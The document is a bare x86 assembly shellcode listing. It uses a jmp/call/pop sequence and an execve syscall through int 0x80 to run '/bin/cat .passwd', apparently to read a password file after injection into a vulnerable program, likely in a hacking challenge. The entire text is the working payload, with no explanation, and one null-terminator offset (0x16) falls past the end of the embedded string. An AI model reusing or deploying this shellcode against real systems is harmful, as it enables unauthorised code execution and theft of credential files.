.text
.globl _start
_start:
	xorl %eax, %eax
	movb $11, %al
	jmp catpasswd
	back:
	movl %esp, %ecx
	movl (%esp), %ebx
	leal 0x9(%ebx), %edx
	movl %edx, 0x4(%esp)
	cdq
	movl %edx, 0x8(%esp)
	movb %dl, 0x8(%ebx)
	movb %dl, 0x16(%ebx)
	int $0x80
catpasswd:
	call back
	.ascii "/bin/cat .passwd"


